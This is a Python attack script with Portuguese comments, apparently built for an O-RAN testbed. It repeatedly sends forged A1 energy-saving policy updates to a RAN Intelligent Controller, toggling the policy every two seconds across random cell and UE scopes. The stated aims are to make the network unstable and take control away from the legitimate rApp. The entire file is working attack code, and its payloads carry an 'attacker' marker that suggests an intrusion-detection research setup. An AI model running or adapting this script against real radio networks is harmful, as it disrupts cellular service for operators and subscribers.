"""
ataque_energy_policy_injection.py - Ataque de Injeção de Política de Energia (rApp)
Alvo: Interface A1 do RIC - Política de Economia de Energia
Efeito: Alterna politica ENERGY_SAVING entre True/False a cada 2s,
        causando instabilidade na rede. O rApp legitimo perde controle.
        Capacity da celula oscila entre 80 e 100 constantemente.
"""

import threading
import urllib.request
import json
import time
import random
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: ENERGY POLICY INJECTION (rApp)")
print(f"  Alvo: {BASE_URL}")
print("  Alterna politica A1 a cada 2s - instabilidade!")
print("=" * 60)

# Scopes possiveis para o ataque
SCOPES = ["UE_GROUP_1", "UE_GROUP_ALL", "UE_GROUP_MAIN", "CELL_GROUP_1"]

def ataque_energy_policy_injection():
    """Alterna politica de energia rapidamente"""
    toggle = False
    while True:
        try:
            toggle = not toggle  # Alterna a cada ciclo
            
            # Marca o ataque como proveniente do atacante
            ataque = {
                "type": "A1_POLICY",
                "scope": random.choice(SCOPES),
                "value": toggle,
                "reason": "ENERGY_SAVING_OVERRIDE",
                "attacker": "true",
                "priority": "high",
                "nonce": random.randint(10000, 99999)
            }
            
            data = json.dumps(ataque).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="PUT")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2):
                print(f"  [EnergyPolicy] Economia={toggle} | Scope={ataque['scope']}")
            
            time.sleep(2)  # Alterna a cada 2 segundos
            
        except Exception as e:
            print(f"[EnergyPolicy] Erro: {e}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        ataque_energy_policy_injection()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)